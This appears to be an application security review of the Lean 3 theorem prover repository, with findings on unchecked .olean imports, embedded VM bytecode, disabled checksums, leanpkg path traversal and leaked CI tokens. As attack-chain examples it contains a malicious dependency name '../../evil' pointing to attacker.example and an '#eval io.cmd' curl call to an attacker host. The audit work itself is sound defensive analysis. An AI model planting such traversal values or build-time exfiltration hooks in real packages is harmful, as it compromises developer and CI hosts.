# Application Security Review — Lean 3 (thMthMnky/lean)

Scope: language server / JSON-RPC, leanpkg, `.olean` deserialization, path handling, CI/CD secrets, credentials, SSRF/redirects/header injection.

Only **MEDIUM / HIGH / CRITICAL** findings with complete attacker→impact chains are listed. Isolated unsafe patterns without a realistic chain are omitted.

---

## CRITICAL-1 — Default trust imports `.olean` declarations without type-checking (soundness bypass)

### Evidence

Default CLI trust exceeds the believer threshold:

```444:444:src/shell/lean.cpp
    unsigned trust_lvl      = LEAN_BELIEVER_TRUST_LEVEL+1;
```

```21:24:src/kernel/environment.h
#ifndef LEAN_BELIEVER_TRUST_LEVEL
// If an environment E is created with a trust level > LEAN_BELIEVER_TRUST_LEVEL, then
// we can add declarations to E without type checking them.
#define LEAN_BELIEVER_TRUST_LEVEL 1024
```

Import path certifies without checking whenever `trust_lvl != 0`:

```802:807:src/kernel/type_checker.cpp
certified_declaration certify_unchecked::certify_or_check(environment const & env, declaration const & d) {
    if (env.trust_lvl() == 0)
        return check(env, d);
    else
        return certify(env, d);
}
```

```321:336:src/library/module.cpp
    void perform(environment & env) const override {
        auto decl = m_decl;
        // ...
        if (m_trust_lvl > env.trust_lvl()) {
            decl = unfold_untrusted_macros(env, decl);
        }

        // TODO(gabriel): this might be a bit more unsafe here than before
        env = import_helper::add_unchecked(env, decl);
    }
```

### Attack chain

1. Attacker publishes a Lean package (or replaces an `.olean` on a shared path / CI cache / `LEAN_PATH` entry) containing a crafted `.olean` with a declaration such as `false_intro : false` (or any unsound theorem).
2. Victim runs `lean`, `lean --make`, `leanpkg build`, or the IDE server with **default** trust (not `-t0`).
3. Loader prefers fresh `.olean` files (`fs_module_vfs::load_module`) and applies `decl_modification` via `add_unchecked` / `certify_or_check` **without kernel type-checking**.
4. Downstream proofs that import the module can derive `false` or “verify” incorrect claims.

### Mitigations

- Documented `-t0` / `leanchecker` / external checkers (`doc/faq.md`).
- Version header gate in `is_candidate_olean_file` (wrong Lean version rejected).
- **Not mitigated by default**: production loaders force `check_hash = false` (see HIGH-2).

### Impact

Breaks the core trust guarantee of a theorem prover: unsound “proofs” accepted. In any workflow that treats Lean proofs as authorization or correctness evidence, this is a full integrity failure.

### Expected by design?

**Yes** — Lean’s performance model trusts `.olean` at default trust. Still CRITICAL for security/soundness review because the default configuration is the unsafe one and supply-chain delivery of oleans is realistic via leanpkg/`LEAN_PATH`.

---

## HIGH-1 — `.olean` files carry executable VM bytecode (`VMC`) loaded on import

### Evidence

```1277:1310:src/library/vm/vm.cpp
struct vm_code_modification : public modification {
    LEAN_MODIFICATION("VMC")
    // ...
    void perform(environment & env) const override {
        vm_decls ext = get_extension(env);
        ext.update(m_decl);
        env = update(env, ext);
    }
    // deserialize rebuilds vm_decl from untrusted stream
    static std::shared_ptr<modification const> deserialize(deserializer & d) {
        name fn; unsigned arity; unsigned code_sz; optional<pos_info> pos;
        d >> fn >> arity >> code_sz >> pos;
        // ...
        for (unsigned i = 0; i < code_sz; i++)
            code.emplace_back(read_vm_instr(d));
        return std::make_shared<vm_code_modification>(
                vm_decl(fn, get_vm_index(fn), arity, code_sz, code.data(), args_info, pos, file_name));
    }
};
```

`#eval` / IO execution path:

```40:52:src/library/eval_helper.cpp
optional<vm_obj> eval_helper::try_exec_io() {
    if (is_app_of(m_ty, get_io_name(), 1)) {
        m_args.push_back(mk_vm_simple(0)); // "world state"
        auto r = invoke_fn();
        // ...
    }
```

IO can spawn processes (`src/library/vm/vm_io.cpp` → `process::spawn` / `execvp`).

### Attack chain

1. Attacker crafts or compiles an `.olean` whose modifications include `VMC` bytecode that, when invoked, calls `io.process.spawn` / file APIs (or ships source that `#eval`s such code after import).
2. Victim imports the module (leanpkg dependency, `LEAN_PATH`, or planted `.olean` next to a `.lean` with older mtime).
3. Bytecode is installed into the environment **with no type-check and no hash check** (CRITICAL-1 + HIGH-2).
4. Victim (or automated build) runs `#eval`, `run_cmd`, a tactic, `--run`, or leanpkg’s own Lean code that touches the malicious definition → **host code execution**.

### Mitigations

- Import itself only *registers* bytecode; execution needs an eval/tactic/`--run` trigger.
- No sandbox around VM IO builtins.

### Impact

Remote/supply-chain **RCE** on developer or CI hosts that build or evaluate untrusted packages; also enables silent exfiltration via `io.cmd`.

### Expected by design?

**Partially** — Lean meta-programming is intentionally powerful. Embedding *unverified* bytecode in the same artifact that skips proof checking amplifies CRITICAL-1 beyond pure soundness into code execution.

---

## HIGH-2 — Olean content hash never enforced on load paths

### Evidence

API defaults to checking:

```103:103:src/library/module.h
olean_data parse_olean(std::istream & in, std::string const & file_name, bool check_hash = true);
```

Both production callers disable it:

```700:706:src/library/module.cpp
module_loader mk_olean_loader(std::vector<std::string> const & path) {
    bool check_hash = false;
    return[=] (std::string const & module_fn, module_name const & ref) {
        // ...
        auto parsed = parse_olean(in, fn, check_hash);
```

```161:163:src/library/module_mgr.cpp
            auto olean_fn = olean_of_lean(id);
            bool check_hash = false;
            auto parsed_olean = parse_olean(in2, olean_fn, check_hash);
```

Hash logic exists but is skipped:

```577:582:src/library/module.cpp
    if (check_hash) {
        unsigned computed_hash = olean_hash(code);
        if (claimed_hash != computed_hash)
            throw exception(sstream() << "file '" << file_name << "' has been corrupted, checksum mismatch");
    }
```

### Attack chain

1. Attacker (or malware with filesystem access) bit-flips or replaces an `.olean` after a legitimate build (shared NFS, CI cache, compromised mirror).
2. Loader accepts the file as long as the version header matches (`is_candidate_olean_file`).
3. Unchecked declarations / `VMC` bytecode from CRITICAL-1 / HIGH-1 are applied.

### Mitigations

- Version string check only.
- Checksum implementation present but explicitly disabled.

### Impact

Removes the only integrity check on serialized modules, enabling silent tampering of the trusted binary proof/code cache.

### Expected by design?

**Unclear / likely accidental** — default parameter is `true`, but every in-tree caller passes `false`. Not documented as a security tradeoff.

---

## HIGH-3 — leanpkg: dependency name path traversal writes clones outside `_target/deps`

### Evidence

```62:78:leanpkg/leanpkg/resolve.lean
| (source.git url rev branch) := do
  let depdir := "_target/deps/" ++ dep.name,
  already_there ← dir_exists depdir,
  // ...
  } else do {
    io.put_str_ln $ dep.name ++ ": cloning " ++ url ++ " to " ++ depdir,
    exec_cmd {cmd := "mkdir", args := ["-p", depdir]},
    exec_cmd {cmd := "git", args := ["clone", url, depdir]}
  },
  hash ← git_parse_origin_revision depdir rev,
  exec_cmd {cmd := "git", args := ["checkout", "--detach", hash], cwd := depdir},
```

Dependency names come from TOML keys with **no** sanitization (`leanpkg/leanpkg/manifest.lean`).

Confirmed behavior: `git clone <url> "_target/deps/../../outside2"` materializes a repo at `./outside2` (escape from `_target/deps`).

### Attack chain

1. Attacker delivers a malicious `leanpkg.toml` (direct dependency, transitive dep after clone of a “normal” URL, or PR against a repo whose CI runs `leanpkg configure`).
2. Toml contains e.g.  
   `[dependencies]`  
   `"../../evil" = { git = "https://attacker.example/repo.git", rev = "…" }`
3. Victim/CI runs `leanpkg configure` / `build` / `install`.
4. `mkdir -p` + `git clone` write a full git checkout **outside** the intended deps directory (overwrite risk if the resolved path is attacker-chosen relative to the project).
5. `construct_path` then injects that location into `leanpkg.path`, so subsequent `lean --make` compiles/loads code from the escaped path.

### Mitigations

- None on `dep.name` (no allowlist, no rejection of `..`, `/`, or absolute segments).

### Impact

Arbitrary directory write as the leanpkg user; plant or overwrite project files; poison `LEAN_PATH` resolution.

### Expected by design?

**No.**

---

## HIGH-4 — leanpkg supply-chain RCE via `#eval` / `io.cmd` during `leanpkg build`

### Evidence

```48:55:leanpkg/leanpkg/main.lean
def make (lean_args : list string) : io unit := do
manifest ← read_manifest,
exec_cmd {
  cmd := "lean",
  args := (match manifest.timeout with some t := ["-T", repr t] | none := [] end) ++
    ["--make"] ++ manifest.effective_path ++ lean_args,
```

```73:75:leanpkg/leanpkg/resolve.lean
    exec_cmd {cmd := "mkdir", args := ["-p", depdir]},
    exec_cmd {cmd := "git", args := ["clone", url, depdir]}
```

`#eval` executes IO (`builtin_cmds.cpp` `eval_cmd` → `eval_helper::try_exec_io`).  
`library/system/io.lean` exposes `io.cmd` → process spawn.

### Attack chain

1. Attacker publishes `https://github.com/attacker/malicious` whose sources include e.g. `#eval io.cmd { cmd := "curl", args := ["attacker", ...] }` or `run_cmd` / attribute `after_set` handlers with IO.
2. Victim runs `leanpkg add attacker/malicious` or adds the git URL, then `leanpkg build` / CI runs `leanpkg configure` + test (as in `.travis.yml` registry job).
3. `git clone` fetches attacker code; `lean --make` elaborates it; `#eval`/IO runs **with the user’s privileges**.

### Mitigations

- No sandbox, no network egress policy, no “build without eval” mode in leanpkg.
- URLs are passed as discrete argv (no shell), which blocks classic shell injection but not malicious Lean code.

### Impact

Full RCE / data theft on developer workstations and CI runners that build untrusted Lean packages.

### Expected by design?

**Yes** for Lean-the-language (tactics/IO are features). **Still a package-manager HIGH** because leanpkg markets “add github user/repo” without isolating builds.

---

## HIGH-5 — CI: GitHub token placed in git remote URL (credential leak)

### Evidence

```4:5:script/setup_nightly.sh
git remote add nightly "https://$GH_TOKEN@github.com/leanprover/lean-nightly.git"
git fetch nightly --tags
```

Sourced from Travis cron and AppVeyor scheduled builds:

```125:130:.travis.yml
    if [[ $TRAVIS_EVENT_TYPE == cron ]]
    then
      [[ -n $FIRST ]] && curl -H "Authorization: Bearer $APPVEYOR_TOKEN" ...
      git fetch --unshallow --tags origin
      . ../script/setup_nightly.sh
```

```28:29:.appveyor.yml
      if [[ $APPVEYOR_SCHEDULED_BUILD == True ]]; then . ../script/setup_nightly.sh; fi &&
```

Token also passed to `gothub` on the CLI (`script/deploy_nightly.sh`).

### Attack chain

1. Nightly/cron job runs `setup_nightly.sh` with `GH_TOKEN` set.
2. Token is stored in `.git/config` and appears in `git remote -v`, failed `git fetch/push` error URLs, debug traces, and process listings (`gothub -s $GH_TOKEN`).
3. Anyone who can read CI logs, cached workspaces, or crash dumps obtains a credential that can push releases to `leanprover/lean-nightly` (and whatever else the token scopes).

### Mitigations

- Token not hardcoded in-repo (env var); AppVeyor GitHub deploy uses `secure:` encryption for a separate token.
- No redaction helpers; URL embedding is the anti-pattern.

### Impact

Compromise of release-publishing credentials → malicious Lean nightlies distributed to users (feeds CRITICAL-1/HIGH-1/HIGH-4).

### Expected by design?

**No** (common CI mistake).

---

## HIGH-6 — CI: Codecov `curl | bash` executes remote script with secret-bearing environment

### Evidence

```155:156:.travis.yml
after_script:
  - if [[ $TESTCOV == ON ]]; then bash <(curl -s https://codecov.io/bash) -x gcov-6; fi
```

Same job matrix can hold `GH_TOKEN` / `APPVEYOR_TOKEN` (used earlier in the pipeline).

### Attack chain

1. Attacker compromises codecov.io bash uploader CDN/content (as in the 2021 Codecov breach) or performs MITM on the cleartext-trusting `curl -s` fetch.
2. Travis `TESTCOV=ON` job downloads and executes the payload.
3. Script inherits CI environment → exfiltrates `GH_TOKEN`, `APPVEYOR_TOKEN`, and repo contents.
4. Follow-on: publish trojan nightlies / trigger AppVeyor builds (Travis already calls AppVeyor with bearer token).

### Mitigations

- None (no checksum pin, no `curl --fail` + reviewed vendor binary).

### Impact

CI secret theft and downstream supply-chain compromise.

### Expected by design?

**No.**

---

## MEDIUM-1 — AppVeyor encrypted GitHub deploy token committed in-repo

### Evidence

```52:57:.appveyor.yml
deploy:
  description: 'Lean release'
  provider: GitHub
  auth_token:
    secure: d+yPrDEAbiNrcf3a0PDNYEn/ieOOP6M7cP9zje+QkJEjHFdjBjWMe8b3qrC1hrus
```

### Attack chain

1. Encrypted blob is public in git history.
2. If AppVeyor account encryption keys leak, or an authorized AppVeyor collaborator is compromised, the token decrypts in CI and can publish GitHub releases for the configured repo.
3. Combined with HIGH-5/HIGH-6, increases value of CI takeover.

### Mitigations

- AppVeyor secure variables are account-bound (fork PRs should not decrypt).
- Still a long-lived credential artifact in version control.

### Impact

Release integrity risk if CI account/keys are weak or reused.

### Expected by design?

**Partially** — AppVeyor’s documented pattern; still discouraged versus short-lived OIDC/GitHub App tokens.

---

## MEDIUM-2 — Module import path traversal via deserialized `..` name components / large relative depth

### Evidence

```195:210:src/util/lean_path.cpp
std::string find_file(search_path const & paths, std::string const & base, optional<unsigned> const & rel, name const & fname,
                      std::initializer_list<char const *> const & extensions) {
    if (!rel) {
        return find_file(paths, fname.to_string(get_dir_sep()), extensions);
    } else {
        auto path = base;
        for (unsigned i = 0; i < *rel; i++) {
            path += get_dir_sep();
            path += "..";
        }
        // ...
```

Names deserialize arbitrary strings (`src/util/name.cpp` `name_deserializer`), and `module_name.m_relative` is an unbounded `unsigned` from the olean stream (`module.cpp` `operator>>`).

`normalize_path` only rewrites separators — it does **not** remove `..`.

### Attack chain

1. Attacker supplies a malicious `.olean` (HIGH-2 makes tampering easy) whose import table lists a name with `..` components and/or a huge `m_relative`.
2. `find_file` walks out of the package directory / search root and loads another `.olean` from an unexpected filesystem location (e.g. world-writable cache, previously planted file).
3. That file’s unchecked declarations/bytecode enter the environment (CRITICAL-1 / HIGH-1).

### Mitigations

- Must still find a file ending in `.olean` that passes the version header check.
- Search is constrained to constructed paths, not open URL fetch.

### Impact

Local filesystem oracle / loader gadget that upgrades olean plant into reliable import of attacker-chosen modules outside the project tree.

### Expected by design?

**No** for `..` inside serialized names; relative `import .Foo` depth is intentional but unbounded depth from binary data is not a safe boundary.

---

## Out of scope / no MEDIUM+ chain found

| Area | Result |
|------|--------|
| Language server network bind/listen/HTTP | Server is **stdin/stdout JSON** only (`server::run`); no socket server. `--server=file` is local debug redirect. No remote JSON-RPC/SSRF/open-redirect/header-injection chain without an already-local attacker. |
| Hardcoded Dropbox tokens | `script/dropbox_upload.py` takes `--dropbox-token` from argv (not hardcoded). |
| Classic HTTP open redirect / header injection | No HTTP client/server application surface in `src/shell` beyond CI scripts. |

---

## Priority remediation (informational)

1. Default to `trust_lvl = 0` or refuse `.olean` unless explicitly `--trust-oleans`; always `check_hash = true`.
2. Sanitize leanpkg dependency names; pass `git clone -- "$url" "$depdir"`; reject `..` and absolute names.
3. Stop embedding `GH_TOKEN` in git URLs; use credential helpers / GitHub App tokens; pin Codecov uploader by hash or drop it.
4. Treat leanpkg builds of untrusted git deps as equivalent to running untrusted code (document + optional sandbox).
